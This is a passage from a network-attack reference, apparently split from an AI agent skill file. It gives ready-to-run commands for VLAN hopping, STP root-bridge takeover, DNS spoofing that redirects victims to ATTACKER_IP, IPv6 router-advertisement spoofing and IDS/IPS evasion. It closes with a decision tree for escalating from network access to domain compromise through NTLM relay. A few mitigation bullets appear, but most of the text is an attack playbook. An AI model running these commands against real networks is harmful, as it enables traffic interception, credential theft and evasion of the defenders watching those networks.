# network-protocol-attacks — 详细参考（由 SKILL.md 拆分）

# 3. Forced NTLM auth → relay to LDAP → create machine account or RBCD
```

### Key Conditions

- SMB signing disabled on targets (for SMB relay)
- LDAP signing not enforced on DC (for LDAP relay)
- Domain Computers quota > 0 (for machine account creation, default: 10)

---

## 5. VLAN HOPPING

### Switch Spoofing (DTP)

```bash
# yersinia — DTP attack to negotiate trunk
yersinia dtp -attack 1 -interface eth0

# frogger.sh — automated VLAN hopping via DTP
./frogger.sh
# Sends DTP frames → switch enables trunking → access all VLANs

# After trunk established:
modprobe 8021q
vconfig add eth0 TARGET_VLAN
ifconfig eth0.TARGET_VLAN 10.10.10.1 netmask 255.255.255.0 up
```

### Double Tagging (802.1Q)

```bash
# Craft double-tagged frame: outer=native VLAN, inner=target VLAN
# scapy:
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="TARGET")/ICMP()
sendp(pkt, iface="eth0")

# Limitation: one-way only (responses go to real gateway)
# Effective for blind attacks (e.g., targeting a server)
```

### Mitigation

- Disable DTP: `switchport nonegotiate`
- Set native VLAN to unused: `switchport trunk native vlan 999`
- Prune VLANs: only allow needed VLANs on trunk ports

---

## 6. STP MANIPULATION

### Root Bridge Claim

```bash
# yersinia — claim root bridge with lowest priority
yersinia stp -attack 4 -interface eth0

# Send BPDUs with priority 0 → become root bridge
# All traffic flows through attacker → MitM
```

### Topology Change Attack

```bash
# Send TC (Topology Change) BPDUs → force MAC table flush
yersinia stp -attack 1 -interface eth0
# Switches flood all ports temporarily → sniff traffic
```

### Mitigation

- BPDU Guard on access ports
- Root Guard on designated ports
- `spanning-tree portfast bpduguard enable`

---

## 7. DNS SPOOFING

### DNS Cache Poisoning

```bash
# bettercap DNS spoofing
bettercap -iface eth0
> set dns.spoof.domains target.com, *.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# ettercap DNS spoofing (via etter.dns config)
echo "target.com A ATTACKER_IP" >> /etc/ettercap/etter.dns
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /VICTIM// /GATEWAY//
```

### Kaminsky Attack Variant

Flood recursive resolver with forged responses for random subdomains, each including a malicious authority section pointing the NS record to attacker-controlled server.

---

## 8. IPv6 ATTACKS

### Router Advertisement Spoofing

```bash
# Send rogue RA → victim configures attacker as default gateway
atk6-fake_router6 eth0 ATTACKER_IPV6_PREFIX/64

# THC-IPv6 suite for comprehensive IPv6 attacks
atk6-parasite6 eth0     # ICMPv6 neighbor spoofing
atk6-redir6 eth0 ...    # Traffic redirection via ICMPv6 redirect
```

### SLAAC Abuse

```bash
# Advertise rogue prefix → victim auto-configures IPv6 address
# Combined with rogue DNS (RA option) → full MitM over IPv6
# Windows prioritizes IPv6 over IPv4 by default
```

---

## 9. IDS/IPS EVASION

| Technique | Method | Tool/Flag |
|---|---|---|
| IP Fragmentation | Split payload across fragments | `nmap -f`, `fragroute` |
| TTL Manipulation | Set TTL to expire at IDS but reach target | `fragroute` |
| Encoding Evasion | URL/Unicode/hex encoding | Manual, custom scripts |
| Session Splicing | Split TCP payload across segments | `fragroute`, `nmap --data-length` |
| Timing-Based | Slow scan to avoid rate-based detection | `nmap -T0`, `nmap -T1` |
| Decoy Scanning | Mix real scan with decoy source IPs | `nmap -D RND:10` |
| Idle/Zombie Scan | Use idle host as scan proxy | `nmap -sI ZOMBIE_IP` |

```bash
# fragroute — fragment and reorder packets
echo "ip_frag 8" > /tmp/frag.conf
echo "order random" >> /tmp/frag.conf
fragroute -f /tmp/frag.conf TARGET_IP

# nmap evasion combinations
nmap -sS -f --mtu 24 --data-length 50 -D RND:5 -T2 TARGET
```

---

## 10. DECISION TREE

```
Network access obtained — want to escalate via network attacks
│
├── On same broadcast domain as targets?
│   ├── YES → ARP spoof for MitM (§1)
│   │   └── Capture plaintext creds or redirect traffic
│   └── NO → need VLAN hopping first (§5)
│       ├── DTP enabled? → switch spoofing
│       └── Know native VLAN? → double tagging
│
├── Windows environment?
│   ├── LLMNR/NBT-NS enabled? (default YES)
│   │   └── Run Responder (§2) → capture NetNTLM hashes
│   │       ├── NTLMv1? → crack fast or relay
│   │       └── NTLMv2? → relay (§2) or crack with rules
│   │
│   ├── WPAD configured or auto-detect? → WPAD abuse (§3)
│   │
│   └── IPv6 not hardened? (default) → mitm6 + ntlmrelayx (§4)
│       └── LDAP relay → RBCD → domain compromise
│
├── Need DNS control?
│   ├── MitM already established? → DNS spoofing (§7)
│   └── DHCPv6 available? → mitm6 for DNS takeover (§4)
│
├── Managed switches with weak config?
│   ├── BPDU Guard off? → STP root bridge claim (§6)
│   └── DTP enabled? → VLAN hopping (§5)
│
├── IPv6 attack surface?
│   └── RA spoofing / SLAAC abuse (§8) → MitM over IPv6
│
└── IDS/IPS in path?
    └── Apply evasion techniques (§9) — fragmentation, timing, encoding
```
